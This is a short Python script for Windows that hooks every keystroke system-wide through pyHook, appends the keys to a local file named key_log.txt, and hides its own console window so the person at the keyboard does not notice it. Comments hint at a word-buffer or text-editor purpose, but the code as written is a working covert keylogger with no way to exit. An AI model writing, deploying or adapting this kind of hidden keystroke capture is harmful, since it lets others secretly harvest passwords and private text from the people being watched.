#!/usr/bin/python

### TODO: THIS HAS A WINDOWS DEPENDENCY!!!!!!!!!!!!
### may want to check out cross-platform loggers
### http://stackoverflow.com/questions/365110/cross-platform-keylogger
import pyHook
import pythoncom
import win32gui
import win32console


LOG_FILE = 'key_log.txt'

## Holds the best guess of user's last word
BUFFER = ''

## Ascii that if seen, means that the buffer needs to be cleared
## e.g. backspace, delete
DIRTY_ASCII = [8,]

def write_to_log(event):
    with open(LOG_FILE, 'a') as f:
        if event.Ascii > 31 and event.Ascii < 127:
            char = chr(event.Ascii)
            f.write(char)
        elif event.Ascii == 13:   ## return
            f.write('\n')       
        else:
            f.write('--'+str(event.Ascii)+'--')

def pressed_chars(event):

    ## http://www.asciitable.com/
    if event.Ascii:
        write_to_log(event)

        if event.Ascii in DIRTY_ASCII:
            BUFFER = ''

        elif event.Ascii == 32: ## space
            ## send the last word off to the text editor
            ###

            BUFFER = ''

### todo: need way of exiting the keylogger?
if __name__ == '__main__':
    window = win32console.GetConsoleWindow()  #go to script window
    win32gui.ShowWindow(window,0)             #hide window

    proc = pyHook.HookManager()      #open pyHook
    proc.KeyDown = pressed_chars     #set pressed_chars function on KeyDown event
    proc.HookKeyboard()              #start the function
    pythoncom.PumpMessages()         #get input
